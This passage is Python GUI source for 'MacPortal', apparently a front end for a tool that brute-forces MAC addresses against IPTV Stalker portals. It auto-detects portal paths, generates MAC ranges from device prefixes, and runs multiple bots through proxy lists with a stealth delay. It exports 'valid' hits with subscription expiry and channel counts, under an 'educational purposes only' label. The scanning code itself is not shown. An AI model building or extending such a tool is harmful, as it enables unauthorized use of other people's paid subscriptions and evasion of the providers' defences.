        "ctx_copy_mac": "Copiar MAC: {value}",
        "ctx_copy_portal": "Copiar Portal: {value}",
        "ctx_copy_details": "Copiar detalles completos",
        "ctx_paste": "Pegar",
        "ctx_copy": "Copiar",
        "ctx_cut": "Cortar",
        "ctx_select_all": "Seleccionar todo",
        "about_text": "MacPortal v1.0\nEscaner MAC con GUI\nSolo con fines educativos.",
        "no_files": "(sin archivos)",
        "random": "Aleatorio",
        "single": "Unico",
        "file": "Archivo",
        "single_mac_label": "Direccion MAC:",
        "warn_missing_mac": "Ingrese una direccion MAC valida!",
        "warn_scan_active": "No se puede probar durante un escaneo.",
        "warn_invalid_mac": "Ingrese una direccion MAC valida.",
    },
}


# ═══════════════════════════════════════════════════════════
# GUI
# ═══════════════════════════════════════════════════════════
class MacPortal(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.lang = "en"

        self.title(self.T("app_title"))
        self.geometry("1150x950")
        self.minsize(750, 500)

        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.portals = []
        self._editing_portal_idx = None
        self.scanner_thread = None
        self._reset_counters()
        self._log_tab_click_count = 0
        self._last_log_tab_click_time = 0

        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        self._build_menu()
        self._build_tabview()
        self._bind_log_tab_easter_egg()
        self._build_control_bar()
        self._load_config()

        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def T(self, key, **kwargs):
        text = TRANSLATIONS.get(self.lang, TRANSLATIONS["en"]).get(key, key)
        if kwargs:
            try:
                text = text.format(**kwargs)
            except Exception:
                pass
        return text

    def _switch_language(self, lang):
        self.lang = lang
        self.title(self.T("app_title"))
        saved_portals = list(self.portals)
        for widget in self.winfo_children():
            widget.destroy()
        self.portals = saved_portals
        self._editing_portal_idx = None
        self._reset_counters()
        self._build_menu()
        self._build_tabview()
        self._bind_log_tab_easter_egg()
        self._build_control_bar()
        self._load_config()

    # ── Menu ──────────────────────────────────────────────
    def _build_menu(self):
        menubar = tk.Menu(self)

        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label=self.T("btn_load_list"), command=self._load_portals_json)
        file_menu.add_command(label=self.T("btn_save_list"), command=self._save_portals_json)
        file_menu.add_separator()
        file_menu.add_command(label=self.T("menu_exit"), command=self.quit)
        menubar.add_cascade(label=self.T("menu_file"), menu=file_menu)

        lang_menu = tk.Menu(menubar, tearoff=0)
        lang_menu.add_command(label="English", command=lambda: self._switch_language("en"))
        lang_menu.add_command(label="Francais", command=lambda: self._switch_language("fr"))
        lang_menu.add_command(label="Espanol", command=lambda: self._switch_language("es"))
        menubar.add_cascade(label=self.T("menu_language"), menu=lang_menu)

        help_menu = tk.Menu(menubar, tearoff=0)
        help_menu.add_command(label=self.T("menu_about"),
                              command=lambda: messagebox.showinfo("About", self.T("about_text")))
        menubar.add_cascade(label=self.T("menu_help"), menu=help_menu)

        self.config(menu=menubar)

    # ── Tab View ──────────────────────────────────────────
    def _build_tabview(self):
        self.tabview = ctk.CTkTabview(self)
        self.tabview.grid(row=0, column=0, sticky="nsew", padx=10, pady=(10, 0))

        tab_setup = self.tabview.add(self.T("tab_setup"))
        tab_results = self.tabview.add(self.T("tab_results"))
        tab_log = self.tabview.add(self.T("tab_log"))

        self._build_setup_tab(tab_setup)
        self._build_results_tab(tab_results)
        self._build_log_tab(tab_log)

    # ── Setup Tab ─────────────────────────────────────────
    def _build_setup_tab(self, parent):
        sf = ctk.CTkScrollableFrame(parent)
        sf.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        parent.grid_rowconfigure(0, weight=1)
        parent.grid_columnconfigure(0, weight=1)

        sf.grid_columnconfigure(4, weight=1)

        row = 0

        # --- General ---
        ctk.CTkLabel(sf, text=f"═══ {self.T('section_general')} ═══",
                      font=("Segoe UI", 13, "bold"),
                      text_color="#4ec9b0").grid(row=row, column=0, columnspan=5, sticky="w", padx=10, pady=(10, 2))
        row += 1

        ctk.CTkLabel(sf, text=self.T("nick_label")).grid(row=row, column=0, sticky="w", padx=10, pady=4)
        self.nick_var = ctk.StringVar(value="")
        nick_entry = ctk.CTkEntry(sf, textvariable=self.nick_var, width=200)
        nick_entry.grid(row=row, column=1, sticky="w", padx=5, columnspan=2)
        self._fix_entry(nick_entry)
        row += 1

        # --- Portals ---
        ctk.CTkLabel(sf, text=f"═══ {self.T('section_portals')} ═══",
                      font=("Segoe UI", 13, "bold"),
                      text_color="#4ec9b0").grid(row=row, column=0, columnspan=5, sticky="w", padx=10, pady=(15, 2))
        row += 1

        ctk.CTkLabel(sf, text=self.T("portal_url")).grid(row=row, column=0, sticky="w", padx=10, pady=4)
        self.portal_url_var = ctk.StringVar(value="")
        self.portal_entry = ctk.CTkEntry(sf, textvariable=self.portal_url_var, width=350)
        self.portal_entry.grid(row=row, column=1, sticky="w", padx=5, columnspan=2)
        self._fix_entry(self.portal_entry)
        row += 1

        ctk.CTkLabel(sf, text=self.T("portal_type")).grid(row=row, column=0, sticky="w", padx=10, pady=4)
        self.portal_type_var = ctk.StringVar(value="c/portal.php")
        ctk.CTkOptionMenu(sf, values=PORTAL_TYPE_OPTIONS,
                          variable=self.portal_type_var, width=280).grid(row=row, column=1, sticky="w", padx=5, columnspan=2)
        ctk.CTkButton(sf, text=self.T("btn_detect"), width=90,
                       command=self._auto_detect_portal).grid(row=row, column=3, padx=5)
        row += 1

        # Portal buttons row
        btn_frame = ctk.CTkFrame(sf, fg_color="transparent")
        btn_frame.grid(row=row, column=0, columnspan=5, sticky="w", padx=10, pady=4)
        ctk.CTkButton(btn_frame, text=self.T("btn_add"), width=75,
                       command=self._add_portal).pack(side="left", padx=2)
        ctk.CTkButton(btn_frame, text=self.T("btn_edit"), width=75,
                       command=self._edit_portal).pack(side="left", padx=2)
        ctk.CTkButton(btn_frame, text=self.T("btn_remove"), width=75,
                       command=self._remove_portal).pack(side="left", padx=2)
        ctk.CTkButton(btn_frame, text=self.T("btn_clear"), width=75,
                       command=self._clear_portals).pack(side="left", padx=2)
        ctk.CTkButton(btn_frame, text=self.T("btn_load_list"), width=100,
                       command=self._load_portals_json).pack(side="left", padx=2)
        ctk.CTkButton(btn_frame, text=self.T("btn_save_list"), width=100,
                       command=self._save_portals_json).pack(side="left", padx=2)
        row += 1

        # Portal listbox
        self.portal_listbox = tk.Listbox(sf, height=4, bg="#2b2b2b", fg="#e0e0e0",
                                          selectbackground="#3a6ea5", font=("Consolas", 10))
        self.portal_listbox.grid(row=row, column=0, columnspan=5, sticky="ew", padx=10, pady=4)
        row += 1

        # --- MAC Settings ---
        ctk.CTkLabel(sf, text=f"═══ {self.T('section_mac')} ═══",
                      font=("Segoe UI", 13, "bold"),
                      text_color="#4ec9b0").grid(row=row, column=0, columnspan=5, sticky="w", padx=10, pady=(15, 2))
        row += 1

        ctk.CTkLabel(sf, text=self.T("mac_source")).grid(row=row, column=0, sticky="w", padx=10, pady=4)
        self.mac_source_var = ctk.StringVar(value="random")
        ctk.CTkSegmentedButton(sf, values=[self.T("random"), self.T("single"), self.T("file")],
                                variable=self.mac_source_var,
                                command=self._on_mac_source_change).grid(
            row=row, column=1, sticky="w", padx=5, columnspan=2)
        row += 1

        # Random MAC frame
        self.random_frame = ctk.CTkFrame(sf, fg_color="transparent")
        self.random_frame.grid(row=row, column=0, columnspan=5, sticky="ew", padx=10, pady=4)

        rf_row = 0
        ctk.CTkLabel(self.random_frame, text=self.T("mac_prefix")).grid(row=rf_row, column=0, sticky="w", padx=5, pady=2)
        self.mac_prefix_var = ctk.StringVar(value="00:1A:79:")
        ctk.CTkOptionMenu(self.random_frame,
                                         values=[f"{i+1}. {p}" for i, p in enumerate(MAC_PREFIXES)],
                                         variable=self.mac_prefix_var, width=200).grid(
            row=rf_row, column=1, sticky="w", padx=5)
        rf_row += 1

        ctk.CTkLabel(self.random_frame, text=self.T("combination")).grid(row=rf_row, column=0, sticky="w", padx=5, pady=2)
        self.mac_combo_var = ctk.StringVar(value="random")
        ctk.CTkSegmentedButton(self.random_frame, values=["random", "cascading"],
                                variable=self.mac_combo_var).grid(
            row=rf_row, column=1, sticky="w", padx=5)
        rf_row += 1

        ctk.CTkLabel(self.random_frame, text=self.T("serial_prefix")).grid(row=rf_row, column=0, sticky="w", padx=5, pady=2)

        nibble_frame = ctk.CTkFrame(self.random_frame, fg_color="transparent")
        nibble_frame.grid(row=rf_row, column=1, sticky="w", padx=5)

        self._nibble_values = [""] + [f"{i:X}" for i in range(16)]

        self.nibble1_var = ctk.StringVar(value="")
        self.nibble2_var = ctk.StringVar(value="")

        self._nibble_vars = [self.nibble1_var, self.nibble2_var]
        self._nibble_menus = []

        for idx, var in enumerate(self._nibble_vars, 1):
            menu = ctk.CTkOptionMenu(nibble_frame, values=self._nibble_values, variable=var, width=45)
            menu.pack(side="left")
            self._nibble_menus.append(menu)

        ctk.CTkButton(nibble_frame, text="✕", width=30, fg_color="#f44747", hover_color="#c93a3a",
                      command=self._reset_nibbles).pack(side="left", padx=(8, 0))

        rf_row += 1

        ctk.CTkLabel(self.random_frame, text=self.T("mac_count")).grid(row=rf_row, column=0, sticky="w", padx=5, pady=2)
        self.mac_count_var = ctk.StringVar(value="1000")
        ctk.CTkEntry(self.random_frame, textvariable=self.mac_count_var, width=120).grid(
            row=rf_row, column=1, sticky="w", padx=5)

        # Single MAC frame
        self.single_frame = ctk.CTkFrame(sf, fg_color="transparent")

        sf_row = 0
        ctk.CTkLabel(self.single_frame, text=self.T("single_mac_label")).grid(row=sf_row, column=0, sticky="w", padx=5, pady=2)
        self.single_mac_var = ctk.StringVar(value="")
        single_entry = ctk.CTkEntry(self.single_frame, textvariable=self.single_mac_var, width=200)
        single_entry.grid(row=sf_row, column=1, sticky="w", padx=5)
        self._fix_entry(single_entry)
        ctk.CTkButton(self.single_frame, text="✕", width=30, fg_color="#f44747", hover_color="#c93a3a",
                      command=self._clear_single_mac).grid(row=sf_row, column=2, padx=5)
        self.single_frame.grid(row=row, column=0, columnspan=5, sticky="ew", padx=10, pady=4)
        self.single_frame.grid_remove()

        # File MAC frame
        self.file_frame = ctk.CTkFrame(sf, fg_color="transparent")

        ff_row = 0
        ctk.CTkLabel(self.file_frame, text=self.T("mac_file_label")).grid(row=ff_row, column=0, sticky="w", padx=5, pady=2)
        self.mac_file_var = ctk.StringVar(value="")
        self.mac_file_combo = ctk.CTkOptionMenu(self.file_frame, values=[self.T("no_files")],
                                                  variable=self.mac_file_var, width=300)
        self.mac_file_combo.grid(row=ff_row, column=1, sticky="w", padx=5)
        ctk.CTkButton(self.file_frame, text=self.T("btn_browse"), width=80,
                       command=self._browse_mac_file).grid(row=ff_row, column=2, padx=5)
        self.file_frame.grid(row=row, column=0, columnspan=5, sticky="ew", padx=10, pady=4)
        self.file_frame.grid_remove()

        row += 1

        # --- Proxy ---
        ctk.CTkLabel(sf, text=f"═══ {self.T('section_proxy')} ═══",
                      font=("Segoe UI", 13, "bold"),
                      text_color="#4ec9b0").grid(row=row, column=0, columnspan=5, sticky="w", padx=10, pady=(15, 2))
        row += 1

        self.use_proxy_var = ctk.BooleanVar(value=False)
        ctk.CTkSwitch(sf, text=self.T("use_proxy"), variable=self.use_proxy_var,
                       command=self._on_proxy_toggle).grid(row=row, column=0, sticky="w", padx=10, pady=4)
        row += 1

        self.proxy_frame = ctk.CTkFrame(sf, fg_color="transparent")

        pf_row = 0
        ctk.CTkLabel(self.proxy_frame, text=self.T("proxy_file_label")).grid(row=pf_row, column=0, sticky="w", padx=5, pady=2)
        self.proxy_file_var = ctk.StringVar(value="")
        self.proxy_file_combo = ctk.CTkOptionMenu(self.proxy_frame, values=[self.T("no_files")],
                                                     variable=self.proxy_file_var, width=280)
        self.proxy_file_combo.grid(row=pf_row, column=1, sticky="w", padx=5)
        ctk.CTkButton(self.proxy_frame, text=self.T("btn_browse"), width=80,
                       command=self._browse_proxy_file).grid(row=pf_row, column=2, padx=5)
        pf_row += 1

        ctk.CTkLabel(self.proxy_frame, text=self.T("proxy_type")).grid(row=pf_row, column=0, sticky="w", padx=5, pady=2)
        self.proxy_type_var = ctk.StringVar(value="Socks5")
        ctk.CTkOptionMenu(self.proxy_frame, values=PROXY_TYPES,
                          variable=self.proxy_type_var, width=150).grid(row=pf_row, column=1, sticky="w", padx=5)

        self.proxy_frame.grid(row=row, column=0, columnspan=5, sticky="ew", padx=10, pady=4)
        row += 1

        # --- Advanced ---
        ctk.CTkLabel(sf, text=f"═══ {self.T('section_advanced')} ═══",
                      font=("Segoe UI", 13, "bold"),
                      text_color="#4ec9b0").grid(row=row, column=0, columnspan=5, sticky="w", padx=10, pady=(15, 2))
        row += 1

        ctk.CTkLabel(sf, text=self.T("bots_label")).grid(row=row, column=0, sticky="w", padx=10, pady=4)
        self.bots_var = ctk.StringVar(value="1")
        ctk.CTkEntry(sf, textvariable=self.bots_var, width=80).grid(row=row, column=1, sticky="w", padx=5)
        row += 1

        ctk.CTkLabel(sf, text=self.T("timeout_label")).grid(row=row, column=0, sticky="w", padx=10, pady=4)
        self.timeout_var = ctk.StringVar(value="10")
        ctk.CTkEntry(sf, textvariable=self.timeout_var, width=80).grid(row=row, column=1, sticky="w", padx=5)
        row += 1

        ctk.CTkLabel(sf, text=self.T("stealth_label")).grid(row=row, column=0, sticky="w", padx=10, pady=4)
        self.stealth_var = ctk.StringVar(value="0")
        ctk.CTkEntry(sf, textvariable=self.stealth_var, width=80).grid(row=row, column=1, sticky="w", padx=5)
        row += 1

        self._refresh_file_lists()

    # ── Results Tab ───────────────────────────────────────
    def _build_results_tab(self, parent):
        top_frame = ctk.CTkFrame(parent, fg_color="transparent")
        top_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=5)
        parent.grid_columnconfigure(0, weight=1)

        self.summary_var = ctk.StringVar(
            value=self.T("summary_format", valid=0, expired=0, errors=0, total=0))
        ctk.CTkLabel(top_frame, textvariable=self.summary_var,
                      font=("Segoe UI", 12, "bold"),
                      text_color="#a0d0ff").pack(side="left")

        ctk.CTkButton(top_frame, text=self.T("btn_export"), width=100,
                       command=self._export_results).pack(side="right", padx=5)

        tree_frame = ctk.CTkFrame(parent)
        tree_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        parent.grid_rowconfigure(1, weight=1)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview",
                        background="#2b2b2b", foreground="#e0e0e0",
                        fieldbackground="#2b2b2b", rowheight=22,
                        font=("Consolas", 10))
        style.configure("Treeview.Heading",
                        background="#3c3c3c", foreground="#ffffff",
                        font=("Segoe UI", 10, "bold"))
        style.map("Treeview",
                  background=[("selected", "#3a6ea5")],
                  foreground=[("selected", "#ffffff")])

        columns = ("mac", "portal", "status", "expiry", "channels", "proxy", "time")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings",
                                  height=20, style="Treeview")

        self.tree.heading("mac", text=self.T("col_mac"))
        self.tree.heading("portal", text=self.T("col_portal"))
        self.tree.heading("status", text=self.T("col_status"))
        self.tree.heading("expiry", text=self.T("col_expiry"))
        self.tree.heading("channels", text=self.T("col_channels"))
        self.tree.heading("proxy", text=self.T("col_proxy"))
        self.tree.heading("time", text=self.T("col_time"))

        self.tree.column("mac", width=150)
        self.tree.column("portal", width=200)
        self.tree.column("status", width=90)
        self.tree.column("expiry", width=140)
        self.tree.column("channels", width=50)
        self.tree.column("proxy", width=130)
        self.tree.column("time", width=60)

        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)

        self.tree.grid(row=0, column=0, sticky="nsew")
        scrollbar.grid(row=0, column=1, sticky="ns")
        tree_frame.grid_rowconfigure(0, weight=1)
        tree_frame.grid_columnconfigure(0, weight=1)

        self.tree.tag_configure("valid", foreground="#4ec9b0")
        self.tree.tag_configure("expired", foreground="#dcdcaa")
        self.tree.tag_configure("not_registered", foreground="#808080")
        self.tree.tag_configure("error", foreground="#f44747")

        self.tree.bind("<Button-3>", self._tree_right_click)

    def _tree_right_click(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            menu = tk.Menu(self, tearoff=0)
            values = self.tree.item(item, "values")
            if values:
                menu.add_command(label=self.T("ctx_copy_mac", value=values[0]),
                                command=lambda: self._copy_text(values[0]))
                menu.add_command(label=self.T("ctx_copy_portal", value=values[1]),
                                command=lambda: self._copy_text(values[1]))
                menu.add_separator()
                for r in state.results:
                    if r.get('mac') == values[0] and r.get('portal_host') == values[1]:
                        menu.add_command(label=self.T("ctx_copy_details"),
                                        command=lambda res=r: self._copy_text(
                                            format_hit(res, self.nick_var.get())))
                        break
            try:
                menu.tk_popup(event.x_root, event.y_root)
            finally:
                menu.grab_release()

    def _copy_text(self, text):
        self.clipboard_clear()
        self.clipboard_append(text)

    def update_results_tree(self, result):
        status = result.get('status', 'unknown')
        tag = status if status in ('valid', 'expired') else ""

        values = (
            result.get('mac', ''),
            result.get('portal_host', ''),
            status.upper(),
            result.get('expiry', ''),
            result.get('channel_count', 0),
            result.get('proxy_used', ''),
            result.get('scan_time_ms', 0),
        )

        def _insert():
            self.tree.insert("", "end", values=values, tags=(tag,))
            if status == 'valid':
                self._cnt_valid += 1
            elif status == 'expired':
                self._cnt_expired += 1
            self._cnt_total += 1
            self.summary_var.set(
                self.T("summary_format",
                       valid=self._cnt_valid,
                       expired=self._cnt_expired,
                       errors=self._cnt_errors,
                       total=self._cnt_total)
            )

        self.after(0, _insert)

    def _reset_counters(self):
        self._cnt_valid = 0
        self._cnt_expired = 0
        self._cnt_errors = 0
        self._cnt_total = 0

    def _export_results(self):
        if not state.results:
            messagebox.showinfo(self.T("warn_no_title"), self.T("warn_no_results"))
            return

        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text", "*.txt"), ("JSON", "*.json"), ("All", "*.*")],
            initialfile=f"macportal_results_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
        )
        if not filepath:
            return

        nick = self.nick_var.get()
        if filepath.endswith(".json"):
            data = []
            for r in state.results:
                export_r = {k: v for k, v in r.items() if k != 'profile'}
                data.append(export_r)
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        else:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"MacPortal - Results Export\n")
                f.write(f"Exported: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
                for i, r in enumerate(state.results, 1):
                    if r['status'] in ('valid', 'expired', 'not_registered'):
                        f.write(format_hit(r, nick))
                        f.write("\n")

        self._log(f"Results exported to {filepath}", "success")

    # ── Log Tab ───────────────────────────────────────────
    def _build_log_tab(self, parent):
        parent.grid_rowconfigure(0, weight=0)
        parent.grid_rowconfigure(1, weight=1)
        parent.grid_columnconfigure(0, weight=1)

        top_frame = ctk.CTkFrame(parent, fg_color="transparent")
        top_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=(10, 0))

        self.raw_egg_label = ctk.CTkLabel(top_frame, text="",
                                          font=("Segoe UI", 10, "bold"),
                                          text_color="#4ec9b0")
        self.raw_egg_label.pack(side="left")

        self.show_real_proxy_ip_var = ctk.BooleanVar(value=False)
        ctk.CTkSwitch(top_frame, text="Show real proxy IP", variable=self.show_real_proxy_ip_var,
                      command=self._on_proxy_ip_toggle).pack(side="left", padx=(10, 0))
        ctk.CTkLabel(top_frame, text="⚠ May slightly slow scan",
                     font=("Segoe UI", 9), text_color="#dcdcaa").pack(side="left", padx=(5, 0))

        ctk.CTkButton(top_frame, text="📋 " + self.T("btn_export"), width=120,
                      command=self._export_log).pack(side="right")

        self.log_text = ctk.CTkTextbox(parent, height=400, font=("Consolas", 10),
                                        text_color="#d4d4d4", fg_color="#1e1e1e",
                                        activate_scrollbars=True)
        self.log_text.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)

        tw = self.log_text._textbox
        tw.tag_configure("success", foreground="#4ec9b0")
        tw.tag_configure("warning", foreground="#dcdcaa")
        tw.tag_configure("error", foreground="#f44747")
        tw.tag_configure("info", foreground="#d4d4d4")
        tw.tag_configure("debug", foreground="#808080")

    def _on_log_tab_click(self):
        import time as _time
        now = _time.time()
        if now - self._last_log_tab_click_time > 2.0:
            self._log_tab_click_count = 0
        self._log_tab_click_count += 1
        self._last_log_tab_click_time = now
        if self._log_tab_click_count >= 10 and not state.raw_easter_egg_enabled:
            state.raw_easter_egg_enabled = True
            self.raw_egg_label.configure(text="RAW activated")
            self._log("RAW activated", "success")

    def _bind_log_tab_easter_egg(self):
        try:
            seg = self.tabview._segmented_button
            log_name = self.T("tab_log")
            if hasattr(seg, '_buttons_dict') and log_name in seg._buttons_dict:
                btn = seg._buttons_dict[log_name]
                btn.bind("<Button-1>", lambda e: self._on_log_tab_click(), add=True)
        except Exception:
            pass

    def _on_proxy_ip_toggle(self):
        enabled = self.show_real_proxy_ip_var.get()
        state.show_real_proxy_ip = enabled
        if enabled:
            self._log("Real proxy IP display enabled - checks IPs in background", "info")
        else:
            self._log("Real proxy IP display disabled", "info")

    def _export_log(self):
        log_content = self.log_text.get("0.0", "end").strip()
        if not log_content:
            messagebox.showinfo(self.T("warn_no_title"), "No log content to export.")
            return

        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text", "*.txt"), ("All", "*.*")],
            initialfile=f"macportal_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
        )
        if not filepath:
            return

        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"MacPortal - Log Export\n")
                f.write(f"Exported: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
                f.write(log_content)
            self._log(f"Log exported to {filepath}", "success")
            messagebox.showinfo("Export Complete", f"Log exported to:\n{filepath}")
        except Exception as e:
            self._log(f"Error exporting log: {e}", "error")
            messagebox.showerror("Export Error", f"Could not export log:\n{e}")

    def _log(self, message, level="info"):
        tag = level if level in ("success", "warning", "error", "info", "debug") else "info"

        def _insert():
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            tw = self.log_text._textbox
            tw.insert("end", f"[{ts}] {message}\n", tag)
            self.log_text.see("end")

        self.after(0, _insert)

    # ── Control Bar ───────────────────────────────────────
    def _build_control_bar(self):
        ctrl = ctk.CTkFrame(self, fg_color="#2b2b2b", corner_radius=8)
        ctrl.grid(row=1, column=0, sticky="ew", padx=10, pady=8)
        ctrl.grid_columnconfigure(2, weight=1)

        self.start_btn = ctk.CTkButton(ctrl, text=self.T("btn_start"), width=100,
                                        fg_color="#4ec9b0", hover_color="#3aa892",
                                        text_color="#000000",
                                        font=("Segoe UI", 11, "bold"),
                                        command=self.start_scanner)
        self.start_btn.grid(row=0, column=0, padx=5, pady=5)

        self.pause_btn = ctk.CTkButton(ctrl, text=self.T("btn_pause"), width=100,
                                        fg_color="#dcdcaa", hover_color="#b8b892",
                                        text_color="#000000",
                                        font=("Segoe UI", 11, "bold"),
                                        command=self.toggle_pause, state="disabled")
        self.pause_btn.grid(row=0, column=1, padx=5, pady=5)

        self.status_var = ctk.StringVar(value=self.T("status_ready"))
        ctk.CTkLabel(ctrl, textvariable=self.status_var,
                      font=("Segoe UI", 10, "bold"),
                      text_color="#a0d0ff").grid(row=0, column=2, sticky="w", padx=10)

        self.progress = ctk.CTkProgressBar(ctrl, width=300, mode="determinate",
                                            fg_color="#3c3c3c", progress_color="#4ec9b0")
        self.progress.grid(row=0, column=3, padx=10, pady=5)
        self.progress.set(0)

        self.stop_btn = ctk.CTkButton(ctrl, text=self.T("btn_stop"), width=100,
                                       fg_color="#f44747", hover_color="#c93a3a",
                                       text_color="#000000",
                                       font=("Segoe UI", 11, "bold"),
                                       command=self.stop_scanner, state="disabled")
        self.stop_btn.grid(row=0, column=4, padx=5, pady=5)

    # ── GUI Helpers ───────────────────────────────────────
    def _fix_entry(self, entry_widget):
        inner = entry_widget._entry

        inner.bind("<Control-v>", lambda e: inner.event_generate("<<Paste>>"))
        inner.bind("<Control-c>", lambda e: inner.event_generate("<<Copy>>"))
        inner.bind("<Control-a>", lambda e: inner.select_range(0, "end"))

        inner.bind("<Button-1>", lambda e: inner.focus_set())

        def _show_menu(event):
            menu = tk.Menu(self, tearoff=0)
            menu.add_command(label=self.T("ctx_paste"),
                            command=lambda: inner.event_generate("<<Paste>>"))
            menu.add_command(label=self.T("ctx_copy"),
                            command=lambda: inner.event_generate("<<Copy>>"))
            menu.add_command(label=self.T("ctx_cut"),
                            command=lambda: inner.event_generate("<<Cut>>"))
            menu.add_separator()
            menu.add_command(label=self.T("ctx_select_all"),
                            command=lambda: inner.select_range(0, "end"))
            try:
                menu.tk_popup(event.x_root, event.y_root)
            finally:
                menu.grab_release()

        inner.bind("<Button-3>", _show_menu)

    def _refresh_file_lists(self):
        combo_files = list_files_in_dir(COMBO_DIR, '.txt')
        if combo_files:
            self.mac_file_combo.configure(values=combo_files)
            if not self.mac_file_var.get():
                self.mac_file_var.set(combo_files[0])

        proxy_files = list_files_in_dir(PROXY_DIR, '.txt')
        if proxy_files:
            self.proxy_file_combo.configure(values=proxy_files)
            if not self.proxy_file_var.get():
                self.proxy_file_var.set(proxy_files[0])
        else:
            self.proxy_file_combo.configure(values=[self.T("no_files")])
            self.proxy_file_var.set(self.T("no_files"))

        current_proxy = self.proxy_file_var.get()
        if current_proxy and current_proxy != self.T("no_files"):
            proxy_path = os.path.join(PROXY_DIR, current_proxy)
            if not os.path.exists(proxy_path):
                self.proxy_file_var.set(self.T("no_files"))

    def _on_mac_source_change(self, value):
        if value in ("random", self.T("random")):
            self.random_frame.grid()
            self.single_frame.grid_remove()
            self.file_frame.grid_remove()
        elif value in ("single", self.T("single")):
            self.random_frame.grid_remove()
            self.single_frame.grid()
            self.file_frame.grid_remove()
        else:
            self.random_frame.grid_remove()
            self.single_frame.grid_remove()
            self.file_frame.grid()
            self._refresh_file_lists()

    def _clear_single_mac(self):
        self.single_mac_var.set("")

    def _on_proxy_toggle(self):
        if self.use_proxy_var.get():
            self.proxy_frame.grid()
            self._refresh_file_lists()
        else:
            self.proxy_frame.grid_remove()

    def _browse_mac_file(self):
        f = filedialog.askopenfilename(initialdir=COMBO_DIR, filetypes=[("Text", "*.txt")])
        if f:
            self.mac_file_var.set(os.path.basename(f))

    def _browse_proxy_file(self):
        f = filedialog.askopenfilename(initialdir=PROXY_DIR, filetypes=[("Text", "*.txt")])
        if f:
            self.proxy_file_var.set(os.path.basename(f))

    def _auto_detect_portal(self):
        url = self.portal_url_var.get().strip()
        if not url:
            messagebox.showwarning(self.T("section_portals"), self.T("warn_missing_url"))
            return

        if state.running:
            messagebox.showwarning(self.T("btn_detect"), self.T("warn_scan_active"))
            return

        self._log(self.T("info_detecting", url=url), "info")

        def _detect():
            candidates = auto_detect_portal_all(url, log_fn=self._log)
            self.after(0, lambda: self._on_detect_done(url, candidates))

        threading.Thread(target=_detect, daemon=True).start()

    def _on_detect_done(self, url, candidates):
        if candidates and candidates[0][0] == 'cloudflare_blocked':
            self._log(self.T("warn_cloudflare"), "warning")
            messagebox.showwarning(self.T("btn_detect"), self.T("warn_cloudflare"))
            return

        if not candidates:
            self._log(self.T("warn_auto_detect_failed"), "warning")
            messagebox.showinfo(self.T("btn_detect"), self.T("warn_auto_detect_failed"))
            return

        if len(candidates) == 1:
            path = candidates[0][1].lstrip('/')
            self.portal_type_var.set(path)
            self._log(self.T("info_detected", result=path), "success")
            return

        found_list = "\n".join(f"  {c[1]}  [HTTP {c[2]}]" for c in candidates)
        messagebox.showinfo(self.T("btn_detect"),
                            f"Found {len(candidates)} portal paths for {url}:\n{found_list}\n\n"
                            f"All {len(candidates)} combinations added to portal list.")

        for pri, path, status in candidates:
            ptype = path.lstrip('/')
            self.portals.append({"url": url, "type": ptype})
            self.portal_listbox.insert(tk.END, f"{url} [{ptype}]")
            self._log(self.T("info_portal_added", url=url, ptype=ptype), "info")

        self.portal_url_var.set("")

    def _add_portal(self, _override_type=None):
        url = self.portal_url_var.get().strip()
        ptype = _override_type or self.portal_type_var.get()

        if not url:
            messagebox.showwarning(self.T("section_portals"), self.T("warn_missing_url"))
            return

        if ptype == "Auto-detect":
            if state.running:
                messagebox.showwarning(self.T("btn_detect"), self.T("warn_scan_active"))
                return

            self._log(self.T("info_detecting", url=url), "info")

            def _detect():
                candidates = auto_detect_portal_all(url, log_fn=self._log)
                self.after(0, lambda: self._on_add_detect_done(url, candidates))

            threading.Thread(target=_detect, daemon=True).start()
            return

        self._finalize_add_portal(url, ptype)

    def _on_add_detect_done(self, url, candidates):
        if candidates and candidates[0][0] == 'cloudflare_blocked':
            self._log(self.T("warn_cloudflare"), "warning")
            messagebox.showwarning(self.T("btn_detect"), self.T("warn_cloudflare"))
            return

        if not candidates:
            messagebox.showwarning(self.T("btn_detect"), self.T("warn_auto_detect_failed"))
            return

        if len(candidates) == 1:
            ptype = candidates[0][1].lstrip('/')
            self._log(self.T("info_detected", result=ptype), "success")
            self._finalize_add_portal(url, ptype)
            return

        found_list = "\n".join(f"  {c[1]}  [HTTP {c[2]}]" for c in candidates)
        messagebox.showinfo(self.T("btn_detect"),
                            f"Found {len(candidates)} portal paths for {url}:\n{found_list}\n\n"
                            f"All {len(candidates)} combinations added to portal list.")

        for pri, path, status in candidates:
            ptype = path.lstrip('/')
            self.portals.append({"url": url, "type": ptype})
            self.portal_listbox.insert(tk.END, f"{url} [{ptype}]")
            self._log(self.T("info_portal_added", url=url, ptype=ptype), "info")

        self.portal_url_var.set("")

    def _finalize_add_portal(self, url, ptype):
        portal = {"url": url, "type": ptype}

